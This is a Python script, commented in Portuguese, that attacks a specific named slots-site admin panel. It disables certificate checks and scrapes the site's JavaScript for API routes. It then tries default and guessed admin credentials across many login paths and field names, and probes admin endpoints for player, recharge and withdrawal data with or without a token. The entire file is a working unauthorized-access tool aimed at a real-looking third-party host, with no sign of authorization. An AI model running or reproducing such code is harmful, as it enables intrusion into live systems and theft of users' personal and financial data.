"""Testa login no PA e explora endpoints admin."""
import urllib.request, urllib.error, ssl, json, time, re

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

PA_HOST = "pa.rainha777slots.com"
BASE    = f"https://{PA_HOST}"

def req(method, path, body=None, token=None, host=PA_HOST):
    h = {"User-Agent": "Mozilla/5.0", "Accept": "application/json, */*",
         "Origin": f"https://{host}", "Referer": f"https://{host}/login"}
    if body is not None: h["Content-Type"] = "application/json"
    if token: h["Authorization"] = f"Bearer {token}"
    data = json.dumps(body).encode() if body else None
    url = f"https://{host}{path}"
    try:
        r = urllib.request.Request(url, data=data, headers=h, method=method)
        with urllib.request.urlopen(r, timeout=10, context=ctx) as resp:
            raw = resp.read(8192).decode("utf-8","ignore")
            try: return resp.status, dict(resp.headers), json.loads(raw)
            except: return resp.status, dict(resp.headers), {"_raw": raw[:500]}
    except urllib.error.HTTPError as e:
        raw = e.read(4096).decode("utf-8","ignore") if e.fp else ""
        try: return e.code, {}, json.loads(raw)
        except: return e.code, {}, {"_raw": raw[:300]}
    except Exception as ex:
        return 0, {}, {"err": str(ex)}

# ─── Verificar o JS do app pra encontrar o baseURL da API ────────

print("Analisando app.3bae0f2c.js pra encontrar baseURL...")
st, _, resp_js = req("GET", "/static/js/app.3bae0f2c.js")
if isinstance(resp_js, dict) and "_raw" in resp_js:
    raw_js = resp_js["_raw"]
elif isinstance(resp_js, str):
    raw_js = resp_js
else:
    raw_js = ""
print(f"  Tamanho JS: {len(raw_js)} chars")
# Procurar baseURL, VUE_APP_BASE_API, process.env
base_matches = re.findall(r'["\`]([^"\`\n]{5,80}(?:rainha|amizade|ccgame|api)[^"\`\n]{0,80})["\`]', raw_js)
print("URLs/referencias encontradas:")
seen = set()
for m in base_matches:
    if m not in seen:
        seen.add(m)
        print(f"  {m}")

# Procurar login endpoint especificamente
login_matches = re.findall(r'["\`]([^"\`\n]{0,50}login[^"\`\n]{0,50})["\`]', raw_js)
print("\nContextos de login:")
seen2 = set()
for m in login_matches:
    if m not in seen2:
        seen2.add(m)
        print(f"  {m}")

# Procurar baseURL config
for kw in ["baseURL", "BASE_URL", "base_url", "VUE_APP", "process.env"]:
    for m in re.finditer(rf'{kw}[^;"\n]{{0,100}}', raw_js):
        print(f"  [{kw}] {m.group(0)[:100]}")

print()

# ─── Credenciais comuns de Vue Admin Template ────────────────────

print("=" * 60)
print("TESTANDO CREDENCIAIS COMUNS DO PA")
print("=" * 60)

# Endpoints de login a tentar
login_paths = [
    "/system/user/gsf/login",
    "/vue-admin-template/user/login",
    "/api/login",
    "/api/user/login",
    "/api/v1/login",
    "/api/admin/login",
    "/login",
    "/user/login",
    "/auth/login",
]

# Credenciais comuns: Vue Admin Template padrão + comuns de admin
credentials = [
    ("admin",  "admin"),
    ("admin",  "admin123"),
    ("admin",  "Admin@123"),
    ("admin",  "123456"),
    ("admin",  "000000"),
    ("admin",  "Admin1234"),
    ("admin",  "password"),
    ("root",   "root"),
    ("root",   "123456"),
    ("admin",  "rainha777"),
    ("admin",  "amizade777"),
    ("admin",  "slots777"),
    ("admin",  ""),
    ("test",   "test"),
    ("agente", "agente"),
    ("agente", "123456"),
    ("operador", "123456"),
]

found_token = None
for path in login_paths:
    for user, pwd in credentials:
        # Tenta variações de campo: username/password, account/password, name/pwd
        for payload in [
            {"username": user, "password": pwd},
            {"account": user,  "password": pwd},
            {"name": user,     "password": pwd},
            {"user": user,     "password": pwd},
            {"loginName": user,"password": pwd},
            {"phone": user,    "password": pwd},
        ]:
            st, hdrs, body = req("POST", path, payload)
            code = body.get("code") if isinstance(body, dict) else None
            data = body.get("data") if isinstance(body, dict) else None
            msg  = str(body.get("msg",""))[:60] if isinstance(body, dict) else str(body)[:100]

            # Sucesso: code==200 OU body tem token/access_token
            success_signals = [
                code == 200 and data,
                "token" in str(data).lower() if data else False,
                "access_token" in str(body).lower(),
            ]
            if any(success_signals):
                print(f"\n  🔴 LOGIN BEM-SUCEDIDO!")
                print(f"  path={path} user={user!r} pwd={pwd!r} campo={list(payload.keys())[0]!r}")
                print(f"  code={code} msg={msg!r}")
                print(f"  data={json.dumps(data, ensure_ascii=False)[:500] if data else body!r}")
                # Extrair token
                if isinstance(data, dict):
                    found_token = data.get("token") or data.get("access_token") or data.get("Authorization")
                elif isinstance(body, dict):
                    found_token = body.get("token") or body.get("access_token")
                if found_token:
                    print(f"  TOKEN: {found_token}")
            elif code not in (None, 401, 403, 404, 405, 500) and st != 404:
                print(f"  [{st}] {path} {user!r}/{pwd!r} → code={code} msg={msg!r}")
        time.sleep(0.2)
    time.sleep(0.3)

if not found_token:
    print("\nNenhum login bem-sucedido com credenciais comuns.")
    print("O PA pode ter credenciais customizadas ou proteção adicional.")

# ─── Com token (se tiver) ou sem: testar endpoints admin ─────────

print("\n" + "=" * 60)
print("ENDPOINTS ADMIN DO PA (com token ou sem)")
print("=" * 60)

# Endpoints admin que o JS do PA referenciou
admin_paths = [
    ("GET",  "/invite/admin/invite/getUserInviteList"),
    ("GET",  "/invite/admin/invite/getInviteConfig"),
    ("GET",  "/invite/admin/invite/getRewardRecordList"),
    ("POST", "/invite/admin/invite/queryInviteDayReportData"),
    ("POST", "/invite/admin/invite/getBindRewardRecord"),
    ("POST", "/invite/admin/invite/getFirstRechargeRewardRecord"),
    ("POST", "/invite/admin/invite/queryInviteRewardData"),
    ("POST", "/invite/admin/invite/queryUnsettleInviteRewardData"),
    ("POST", "/invite/admin/invite/queryInviteRewardNoSettle"),
    # Genéricos
    ("GET",  "/api/player/list"),
    ("GET",  "/api/user/list"),
    ("GET",  "/api/finance/list"),
    ("GET",  "/api/recharge/list"),
    ("GET",  "/api/withdraw/list"),
]

for method, path in admin_paths:
    st, _, body = req(method, path, token=found_token)
    code = body.get("code") if isinstance(body, dict) else None
    data = body.get("data") if isinstance(body, dict) else None
    msg  = str(body.get("msg",""))[:60] if isinstance(body, dict) else ""
    raw_hint = str(body.get("_raw",""))[:100] if isinstance(body, dict) else ""
    if code == 200 and data:
        print(f"  🔴 [{method:5} {st}] {path} → code={code} data_type={type(data).__name__}")
        print(f"    DATA: {json.dumps(data, ensure_ascii=False)[:400]}")
    elif code not in (None, 401, 403, 404, 405, 500):
        print(f"  [{method:5} {st}] {path} → code={code} msg={msg!r}")
    time.sleep(0.4)

print("\nConcluído.")
